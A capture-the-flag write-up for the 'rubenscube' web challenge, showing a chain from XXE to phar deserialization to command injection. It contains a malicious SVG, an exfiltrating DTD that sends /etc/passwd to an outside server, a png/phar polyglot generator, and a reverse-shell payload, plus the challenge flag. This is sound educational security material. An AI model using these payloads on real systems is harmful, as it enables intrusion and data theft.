# rubenscube

**Category**: web
**Author**: @viktoredstrom, @mattiasgrenfeldt

---
We're prompted with this website which allows us to upload images. The robot is an obvious hint to checkout `/robots.txt`:

```
User-agent: *
Disallow: /harming/humans
Disallow: /ignoring/human/orders
Disallow: /harm/to/self
Disallow: source.zip
```

We get the source for free, neat. Here's the relevant code for the upload itself, `upload.php`:
```php
<?php
session_start();

function calcImageSize($file, $mime_type) {
    if ($mime_type == "image/png"||$mime_type == "image/jpeg") {
        $stats = getimagesize($file);  // Doesn't work for svg...
        $width = $stats[0];
        $height = $stats[1];
    } else {
        $xmlfile = file_get_contents($file);
        $dom = new DOMDocument();
        $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
        $svg = simplexml_import_dom($dom);
        $attrs = $svg->attributes();
        $width = (int) $attrs->width;
        $height = (int) $attrs->height;
    }
    return [$width, $height];
}


class Image {

    function __construct($tmp_name)
    {
        $allowed_formats = [
            "image/png" => "png",
            "image/jpeg" => "jpg",
            "image/svg+xml" => "svg"
        ];
        $this->tmp_name = $tmp_name;
        $this->mime_type = mime_content_type($tmp_name);

        if (!array_key_exists($this->mime_type, $allowed_formats)) {
            // I'd rather 500 with pride than 200 without security
            die("Invalid Image Format!");
        }

        $size = calcImageSize($tmp_name, $this->mime_type);
        if ($size[0] * $size[1] > 1337 * 1337) {
            die("Image too big!");
        }

        $this->extension = "." . $allowed_formats[$this->mime_type];
        $this->file_name = sha1(random_bytes(20));
        $this->folder = $file_path = "images/" . session_id() . "/";
    }

    function create_thumb() {
        $file_path = $this->folder . $this->file_name . $this->extension;
        $thumb_path = $this->folder . $this->file_name . "_thumb.jpg";
        system('convert ' . $file_path . " -resize 200x200! " . $thumb_path);
    }

    function __destruct()
    {
        if (!file_exists($this->folder)){
            mkdir($this->folder);
        }
        $file_dst = $this->folder . $this->file_name . $this->extension;
        move_uploaded_file($this->tmp_name, $file_dst);
        $this->create_thumb();
    }
}

new Image($_FILES['image']['tmp_name']);
header('Location: index.php');
```

Cool, so we're allowed to upload jpeg, png and **svg**, there's a trivial XXE vulnerability inside `function calcImageSize(...)`. Lets craft an malicious SVG file:

```html
<?xml version="1.0" encoding="iso-8859-1"?>
<!DOCTYPE svg [
<!ELEMENT svg ANY >
<!ENTITY % sp SYSTEM "http://127.0.0.1:3838/xxe.dtd">
%sp;
%param1;
]>
<svg>&sp;</svg>
```
Where xxe.dtd is our malicious DTD:
```html
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://localhost:1338/?%data;'>">
```

Localhost above is switched for our servers IP. We're now able to read any file on the filesystem, but where's the flag exactly? As it turns out there's more to this challenge. By using the `phar://` handler  we're able to perform a PHP object injection, this makes a lot of sense in hindsight if one just looks at how ``` Image``` is structured. By controlling `$this->folder` we're able to pass any command we want into `system()`.

But we can't just straight up upload some phar file, we're still resticted to only being able to upload images. Polyglot to the rescue!

There seems to be a well spread way of making jpg/phar polyglot files. We found this repo which implemented the embedding: `https://github.com/kunte0/phar-jpg-polyglot`. But the jpg/phar polyglot it produced didn't get the right mime type from the php function `mime_content_type()`. Instead, by putting an entire png image as the `$prefix` as the code does for gif/phar polyglots we created a png/phar polyglot. This got recognized by `mime_content_type()` as a png image.

```php
<?php
function generate_base_phar($o, $prefix){
    global $tempname;
    @unlink($tempname);
    $phar = new Phar($tempname);
    $phar->startBuffering();
    $phar->addFromString("test.txt", "test");
    $phar->setStub("$prefix<?php __HALT_COMPILER(); ?>");
    $phar->setMetadata($o);
    $phar->stopBuffering();

    $basecontent = file_get_contents($tempname);
    @unlink($tempname);
    return $basecontent;
}

...

$object = new Image("blahbloh"); // The class Image is the same as the above source
$object->folder = '; $(php -r \'$sock=fsockopen("127.0.0.1",6666);exec("/bin/sh -i <&3 >&3 2>&3");\') ; #'; // Swap localhost for our servers ip.

$tempname = 'temp.phar';
$outfile = 'out.png';
$payload = $object;

$prefix = "\x89\x50\x4e\x47...."; //2long :( - prefix is a png file

var_dump(serialize($object));
file_put_contents($outfile, generate_base_phar($payload, $prefix));
```

And our final xxe.dtd being:
```html
<!ENTITY % data SYSTEM "phar://...{path to polyglot phar image}.../test.txt">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://localhost:1338/?%data;'>">
```

Bingo, now we have a shell. There's the binary `flag_dispenser`, and by running it gives us our flag: `midnight{R3lying_0n_PHP_4lw45_W0rKs}`